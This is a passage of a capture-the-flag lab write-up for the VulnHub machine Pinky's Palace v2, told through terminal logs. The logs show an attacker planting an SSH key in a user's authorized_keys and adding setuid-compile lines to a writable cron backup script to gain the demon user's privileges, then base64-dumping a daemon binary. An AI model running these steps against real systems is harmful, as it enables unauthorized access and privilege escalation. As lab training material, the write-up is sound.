-rwsr-sr-x 1 pinky   stefano 8696 Apr 29 14:23 pinky
-rw-r--r-- 1 stefano stefano  146 Apr 29 14:15 setuid.c
drwx------ 3 root    root    4096 Apr 29 01:32 systemd-private-6613542a68044486b48ca19894de08e4-apache2.service-wjrzTA
drwx------ 3 root    root    4096 Apr 29 01:32 systemd-private-6613542a68044486b48ca19894de08e4-systemd-timesyncd.service-HKNOVK
$ cd /home
$ ls -l
total 12
drwxr-x--- 3 demon   demon   4096 Mar 17 20:02 demon
drwxr-x--- 3 pinky   pinky   4096 Mar 17 21:27 pinky
drwxr-xr-x 4 stefano stefano 4096 Apr 29 14:15 stefano
$ cd pinky
$ ls -l
total 4
drwxr-xr-x 2 pinky pinky 4096 Mar 17 04:01 messages
$ cd messages
$ ls -l
total 4
-rw-r--r-- 1 pinky pinky 62 Apr 29 14:23 stefano_msg.txt
$ cat stefano_msg.txt
Hi it's Stefano!
Testing!
Test!
pinky
pinky
pinky
pinky
pinky
$ cd ..
$ ls -lah
total 28K
drwxr-x--- 3 pinky pinky 4.0K Mar 17 21:27 .
drwxr-xr-x 5 root  root  4.0K Mar 17 15:20 ..
-rw------- 1 pinky pinky   66 Mar 17 21:27 .bash_history
-rw-r--r-- 1 pinky pinky  220 Mar 17 04:27 .bash_logout
-rw-r--r-- 1 pinky pinky 3.5K Mar 17 04:27 .bashrc
-rw-r--r-- 1 pinky pinky  675 Mar 17 04:27 .profile
drwxr-xr-x 2 pinky pinky 4.0K Mar 17 04:01 messages
$ cat .bash_history
ls -al
cd
ls -al
cd /usr/local/bin
ls -al
vim backup.sh
su demon
$ cd /usr/local/bin
$ ls -l
total 4
-rwxrwx--- 1 demon pinky 113 Mar 17 21:24 backup.sh
$ cat backup.sh
cat: backup.sh: Permission denied
$
```

```sh
root@kali:~/Pinkys-Palace2# mkdir ssh
root@kali:~/Pinkys-Palace2# cd ssh/
root@kali:~/Pinkys-Palace2/ssh# ssh-keygen -f vulnhub-pinky
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in vulnhub-pinky.
Your public key has been saved in vulnhub-pinky.pub.
The key fingerprint is:
SHA256:ZlSLT8BOTUhLc9RhQji7pxwGlD9xRYOrq9SsZwGE/0w root@kali
The key's randomart image is:
+---[RSA 2048]----+
|     . +=BB=*.   |
|    . +.BB++..   |
|     + ++=o.     |
|      +.Eo.      |
|       *S+.      |
|       =O .      |
|      .oo*       |
|     . .*        |
|      o+         |
+----[SHA256]-----+
root@kali:~/Pinkys-Palace2/ssh# ls -l
total 8
-rw------- 1 root root 1679 Apr 29 17:30 vulnhub-pinky
-rw-r--r-- 1 root root  391 Apr 29 17:30 vulnhub-pinky.pub
root@kali:~/Pinkys-Palace2/ssh# cat vulnhub-pinky.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6uqG+5VX39NEI1ucf5tpQrd5oSdyUQAJoP7nbG0AzjYBxdE2QU1CqIQ01EryeYYI6n6VfiO9WvEXrWbftgKT3Ymh54tzf57b5UzzChK+rvsSwEupa83Ud/VTJr19cLteiwAe4prDVO4G9zBIyiM0cQKMJDiNd1GEWW4zvCZ1wvpvEnHbXmllykp+JAUu3Pel6gZGD+nSEkS07MevkdKHUWnaUZKeHpYxb7LO1vgiDKRG0gASDNmUPU6YlGv4tjEBlcXNHzg8ckjEmXsxkqhf+QdAhG9O3PVdkW/8tWVkQrMjkfzYoXc/r2h659/7lTrR6bhdCRF3W59cIVt/y/llV root@kali
root@kali:~/Pinkys-Palace2/ssh#
```

```sh
$ mkdir .ssh
$ ls -lah
total 32K
drwxr-x--- 4 pinky pinky   4.0K Apr 29 14:29 .
drwxr-xr-x 5 root  root    4.0K Mar 17 15:20 ..
-rw------- 1 pinky pinky     66 Mar 17 21:27 .bash_history
-rw-r--r-- 1 pinky pinky    220 Mar 17 04:27 .bash_logout
-rw-r--r-- 1 pinky pinky   3.5K Mar 17 04:27 .bashrc
-rw-r--r-- 1 pinky pinky    675 Mar 17 04:27 .profile
drwxr-xr-x 2 pinky stefano 4.0K Apr 29 14:29 .ssh
drwxr-xr-x 2 pinky pinky   4.0K Mar 17 04:01 messages
$ cd .ssh
$ vi authorized_keys
$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6uqG+5VX39NEI1ucf5tpQrd5oSdyUQAJoP7nbG0AzjYBxdE2QU1CqIQ01EryeYYI6n6VfiO9WvEXrWbftgKT3Ymh54tzf57b5UzzChK+rvsSwEupa83Ud/VTJr19cLteiwAe4prDVO4G9zBIyiM0cQKMJDiNd1GEWW4zvCZ1wvpvEnHbXmllykp+JAUu3Pel6gZGD+nSEkS07MevkdKHUWnaUZKeHpYxb7LO1vgiDKRG0gASDNmUPU6YlGv4tjEBlcXNHzg8ckjEmXsxkqhf+QdAhG9O3PVdkW/8tWVkQrMjkfzYoXc/r2h659/7lTrR6bhdCRF3W59cIVt/y/llV root@kali
$ chmod 600 authorized_keys
```

```sh
root@kali:~/Pinkys-Palace2/ssh# chmod 600 vulnhub-pinky
root@kali:~/Pinkys-Palace2/ssh# ssh -i vulnhub-pinky pinky@pinkydb -p 4655
The authenticity of host '[pinkydb]:4655 ([192.168.1.26]:4655)' can't be established.
ECDSA key fingerprint is SHA256:u986iF153Xa6BbFapGcWhsyzav6u/iFhjUwFkG3+zTk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[pinkydb]:4655' (ECDSA) to the list of known hosts.
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pinky@Pinkys-Palace:~$ id
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
pinky@Pinkys-Palace:~$ cd /usr/local/bin/
pinky@Pinkys-Palace:/usr/local/bin$ ls -l
total 4
-rwxrwx--- 1 demon pinky 113 Mar 17 21:24 backup.sh
pinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
#
#
#
pinky@Pinkys-Palace:/usr/local/bin$
pinky@Pinkys-Palace:/usr/local/bin$ vi backup.sh
pinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
gcc /tmp/setuid.c -o /tmp/demon
chmod +s /tmp/demon
#
#
#
pinky@Pinkys-Palace:/usr/local/bin$
```

```sh
pinky@Pinkys-Palace:/usr/local/bin$ ls -la /tmp
total 52
drwxrwxrwt  9 root    root    4096 Apr 29 14:39 .
drwxr-xr-x 25 root    root    4096 Mar 17 19:31 ..
drwxrwxrwt  2 root    root    4096 Apr 29 01:32 .font-unix
drwxrwxrwt  2 root    root    4096 Apr 29 01:32 .ICE-unix
-rw-r--r--  1 pinky   stefano    0 Apr 29 14:08 owned
-rwsr-sr-x  1 pinky   stefano 8696 Apr 29 14:23 pinky
-rw-r--r--  1 stefano stefano  146 Apr 29 14:15 setuid.c
drwx------  3 root    root    4096 Apr 29 01:32 systemd-private-6613542a68044486b48ca19894de08e4-apache2.service-wjrzTA
drwx------  3 root    root    4096 Apr 29 01:32 systemd-private-6613542a68044486b48ca19894de08e4-systemd-timesyncd.service-HKNOVK
drwxrwxrwt  2 root    root    4096 Apr 29 01:32 .Test-unix
drwxrwxrwt  2 root    root    4096 Apr 29 01:32 .X11-unix
drwxrwxrwt  2 root    root    4096 Apr 29 01:32 .XIM-unix
pinky@Pinkys-Palace:/usr/local/bin$ date
Sun Apr 29 14:39:30 PDT 2018
pinky@Pinkys-Palace:/tmp$ ls -l
total 36
-rwsr-sr-x 1 demon   demon   8696 Apr 29 14:45 demon
-rw-r--r-- 1 pinky   stefano    0 Apr 29 14:08 owned
-rwsr-sr-x 1 pinky   stefano 8696 Apr 29 14:23 pinky
-rw-r--r-- 1 stefano stefano  146 Apr 29 14:15 setuid.c
drwx------ 3 root    root    4096 Apr 29 01:32 systemd-private-6613542a68044486b48ca19894de08e4-apache2.service-wjrzTA
drwx------ 3 root    root    4096 Apr 29 01:32 systemd-private-6613542a68044486b48ca19894de08e4-systemd-timesyncd.service-HKNOVK
pinky@Pinkys-Palace:/tmp$
pinky@Pinkys-Palace:/tmp$
```

```sh
pinky@Pinkys-Palace:/tmp$ ./demon
$ id
uid=1000(pinky) gid=1000(pinky) euid=1001(demon) egid=1001(demon) groups=1001(demon),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(pinky)
$ cd ~demon
$ ls -lah
total 24K
drwxr-x--- 3 demon demon 4.0K Mar 17 20:02 .
drwxr-xr-x 5 root  root  4.0K Mar 17 15:20 ..
lrwxrwxrwx 1 root  root     9 Mar 17 20:02 .bash_history -> /dev/null
-rw-r--r-- 1 demon demon  220 May 15  2017 .bash_logout
-rw-r--r-- 1 demon demon 3.5K May 15  2017 .bashrc
lrwxrwxrwx 1 root  root     9 Mar 17 20:02 .mysql_history -> /dev/null
-rw-r--r-- 1 demon demon  675 May 15  2017 .profile
drwxr-xr-x 2 demon demon 4.0K Apr 29 14:45 backups
$ find / -type f -user demon 2>/dev/null
/tmp/demon
/daemon/panel
/home/demon/backups/backup.tar.gz
/home/demon/.bashrc
/home/demon/.profile
/home/demon/.bash_logout
/usr/local/bin/backup.sh
$ cd /daemon
$ ls -l
total 16
-rwxr-x--- 1 demon demon 13280 Mar 17 19:48 panel
$ file panel
panel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2d568c8bce502884642e6a62b93033441b616e46, not stripped
$ ./panel
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
[-] binding to socket
^C
$
$ base64 panel
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAQAhAAAAAAABAAAAAAAAAAGAsAAAAAAAAAAAAAEAAOAAJ
AEAAHgAdAAYAAAAFAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
AAAAAAAAAwAAAAQAAAA4AgAAAAAAADgCQAAAAAAAOAJAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABQAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAEwOAAAAAAAATA4AAAAAAAAAACAA
AAAAAAEAAAAGAAAACB4AAAAAAAAIHmAAAAAAAAgeYAAAAAAAoAIAAAAAAACoAgAAAAAAAAAAIAAA
AAAAAgAAAAYAAAAgHgAAAAAAACAeYAAAAAAAIB5gAAAAAADQAQAAAAAAANABAAAAAAAACAAAAAAA
AAAEAAAABAAAAFQCAAAAAAAAVAJAAAAAAABUAkAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA
AFDldGQEAAAA1AwAAAAAAADUDEAAAAAAANQMQAAAAAAARAAAAAAAAABEAAAAAAAAAAQAAAAAAAAA
UeV0ZAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAABS
5XRkBAAAAAgeAAAAAAAACB5gAAAAAAAIHmAAAAAAAPgBAAAAAAAA+AEAAAAAAAABAAAAAAAAAC9s
aWI2NC9sZC1saW51eC14ODYtNjQuc28uMgAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAAGAAAAIAAA
AAQAAAAUAAAAAwAAAEdOVQAtVoyLzlAohGQuamK5MDNEG2FuRgEAAAABAAAAAQAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVAAAABIAAAAAAAAAAAAAAAAAAAAA
AAAAEgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAWQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAPAAAABIA
AAAAAAAAAAAAAAAAAAAAAAAAHgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAQwAAABIAAAAAAAAAAAAA
AAAAAAAAAAAANQAAABIAAAAAAAAAAAAAAAAAAAAAAAAASAAAABIAAAAAAAAAAAAAAAAAAAAAAAAA
ZAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAcQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAgwAAACAAAAAA
AAAAAAAAAAAAAAAAAAAALgAAABIAAAAAAAAAAAAAAAAAAAAAAAAATwAAABIAAAAAAAAAAAAAAAAA
AAAAAAAAagAAABIAAAAAAAAAAAAAAAAAAAAAAAAAGQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAJAAA
ABIAAAAAAAAAAAAAAAAAAAAAAAAAKQAAABIAAAAAAAAAAAAAAAAAAAAAAAAACwAAABIAAAAAAAAA
AAAAAAAAAAAAAAAAAGxpYmMuc28uNgBzb2NrZXQAc3RyY3B5AGV4aXQAaHRvbnMAd2FpdABmb3Jr
AGxpc3RlbgBwcmludGYAc3RybGVuAHNlbmQAbWVtc2V0AGJpbmQAcmVjdgBzZXRzb2Nrb3B0AGNs
b3NlAGFjY2VwdABfX2xpYmNfc3RhcnRfbWFpbgBfX2dtb25fc3RhcnRfXwBHTElCQ18yLjIuNQAA
AAIAAgACAAIAAgACAAIAAgACAAIAAAACAAIAAgACAAIAAgACAAAAAAABAAEAAQAAABAAAAAAAAAA
dRppCQAAAgCSAAAAAAAAAPAfYAAAAAAABgAAAAoAAAAAAAAAAAAAAPgfYAAAAAAABgAAAAsAAAAA
AAAAAAAAABggYAAAAAAABwAAAAEAAAAAAAAAAAAAACAgYAAAAAAABwAAAAIAAAAAAAAAAAAAACgg
YAAAAAAABwAAAAMAAAAAAAAAAAAAADAgYAAAAAAABwAAAAQAAAAAAAAAAAAAADggYAAAAAAABwAA
AAUAAAAAAAAAAAAAAEAgYAAAAAAABwAAAAYAAAAAAAAAAAAAAEggYAAAAAAABwAAAAcAAAAAAAAA
AAAAAFAgYAAAAAAABwAAAAgAAAAAAAAAAAAAAFggYAAAAAAABwAAAAkAAAAAAAAAAAAAAGAgYAAA
AAAABwAAAAwAAAAAAAAAAAAAAGggYAAAAAAABwAAAA0AAAAAAAAAAAAAAHAgYAAAAAAABwAAAA4A
AAAAAAAAAAAAAHggYAAAAAAABwAAAA8AAAAAAAAAAAAAAIAgYAAAAAAABwAAABAAAAAAAAAAAAAA
AIggYAAAAAAABwAAABEAAAAAAAAAAAAAAJAgYAAAAAAABwAAABIAAAAAAAAAAAAAAEiD7AhIiwXV
GCAASIXAdAL/0EiDxAjDAP810hggAP8l1BggAA8fQAD/JdIYIABoAAAAAOng/////yXKGCAAaAEA
AADp0P////8lwhggAGgCAAAA6cD/////JboYIABoAwAAAOmw/////yWyGCAAaAQAAADpoP////8l
qhggAGgFAAAA6ZD/////JaIYIABoBgAAAOmA/////yWaGCAAaAcAAADpcP////8lkhggAGgIAAAA
6WD/////JYoYIABoCQAAAOlQ/////yWCGCAAaAoAAADpQP////8lehggAGgLAAAA6TD/////JXIY
IABoDAAAAOkg/////yVqGCAAaA0AAADpEP////8lYhggAGgOAAAA6QD/////JVoYIABoDwAAAOnw
/v//Me1JidFeSIniSIPk8FBUScfAAAxAAEjHwZALQABIx8erCUAA/xWGFyAA9A8fRAAAuK8gYABV
SC2oIGAASIP4DkiJ5XYbuAAAAABIhcB0EV2/qCBgAP/gZg8fhAAAAAAAXcMPH0AAZi4PH4QAAAAA
AL6oIGAAVUiB7qggYABIwf4DSInlSInwSMHoP0gBxkjR/nQVuAAAAABIhcB0C12/qCBgAP/gDx8A
XcNmDx9EAACAPbEXIAAAdRFVSInl6G7///9dxgWeFyAAAfPDDx9AAL8YHmAASIM/AHUF65MPHwC4
AAAAAEiFwHTxVUiJ5f/QXel6////VUiJ5UiD7BBIiX34SItF+EiJxkiNPcgCAAC4AAAAAOhG/v//
vwAAAADonP7//1VIieVIg8SASIl9iIl1hEiLVYhIjUWQSInWSInH6Mr9//9IjUWQSInH6N79//9I
icJIjXWQi0WEuQAAAACJx+jo/f//kMnDVUiJ5UiB7FAQAADoZf7//4lF/IN9/AAPha0BAADHRfgB
AAAAx0XsAQAAALoAAAAAvgEAAAC/AgAAAOhG/v//iUX0g330/3UMSI09JgIAAOg3////SI1V7ItF
9EG4BAAAAEiJ0boCAAAAvgEAAACJx+hA/f//g/j/dQxIjT0HAgAA6AX///9mx0XQAgC/aXoAAOg/
/f//ZolF0sdF1AAAAABIjUXQSIPACLoIAAAAvgAAAABIicfoSv3//0iNTdCLRfS6EAAAAEiJzonH
6GT9//+D+P91DEiNPcABAADoqf7//4tF9L4FAAAAicfoNP3//4P4/3UMSI09sgEAAOiJ/v//x0W8
EAAAAEiNVbxIjU3Ai0X0SInOicfoJ/3//4lF8IN98P91DEiNPYsBAADoWP7//4tF8LkAAAAAuh8A
AABIjTWGAQAAicfol/z//4tF8LkAAAAAuiEAAABIjTWLAQAAicfofPz//4tF8LkAAAAAuhkAAABI
jTWRAQAAicfoYfz//0iNtbDv//+LRfC5AAAAALoAEAAAicfo9vv//4lF+ItV8EiNhbDv//+J1kiJ
x+gD/v//i0XwicfoVfz//78AAAAA6Iv8//+/AAAAAOiR/P//6TL+//9mLg8fhAAAAAAAZpBBV0FW
QYn/QVVBVEyNJWYSIABVSI0tZhIgAFNJifZJidVMKeVIg+wISMH9A+hX+///SIXtdCAx2w8fhAAA
AAAATInqTIn2RIn/Qf8U3EiDwwFIOd116kiDxAhbXUFcQV1BXkFfw5BmLg8fhAAAAAAA88MAAEiD
7AhIg8QIwwAAAAEAAgAAAAAAWy1dICVzCgBbLV0gRmFpbCBpbiBzb2NrZXQAc2V0dGluZyBzb2Nr
IG9wdGlvbnMAYmluZGluZyB0byBzb2NrZXQAbGlzdGVuaW5nAG5ldyBzb2NrIGZhaWxlZAAAAAAA
WytdIFdlbGNvbWUgdG8gVGhlIERhZW1vbiBbK10KAABUaGlzIGlzIHNvb24gdG8gYmUgb3VyIGJh
Y2tkb29yCgBpbnRvIFBpbmt5J3MgUGFsYWNlLgo9PiAAAAABGwM7QAAAAAcAAABc+v//jAAAAGz7
//9cAAAAYvz//7QAAACQ/P//1AAAANf8///0AAAAvP7//xQBAAAs////XAEAABQAAAAAAAAAAXpS
AAF4EAEbDAcIkAEHEBQAAAAcAAAACPv//ysAAAAAAAAAAAAAABQAAAAAAAAAAXpSAAF4EAEbDAcI
kAEAACQAAAAcAAAAyPn//xABAAAADhBGDhhKDwt3CIAAPxo7KjMkIgAAAAAcAAAARAAAAKb7//8u
AAAAAEEOEIYCQw0GAAAAAAAAABwAAABkAAAAtPv//0cAAAAAQQ4QhgJDDQYCQgwHCAAAHAAAAIQA
AADb+///2QEAAABBDhCGAkMNBgAAAAAAAABEAAAApAAAAKD9//9lAAAAAEIOEI8CQg4YjgNFDiCN
BEIOKIwFSA4whgZIDjiDB00OQHIOOEEOMEEOKEIOIEIOGEIOEEIOCAAUAAAA7AAAAMj9//8CAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
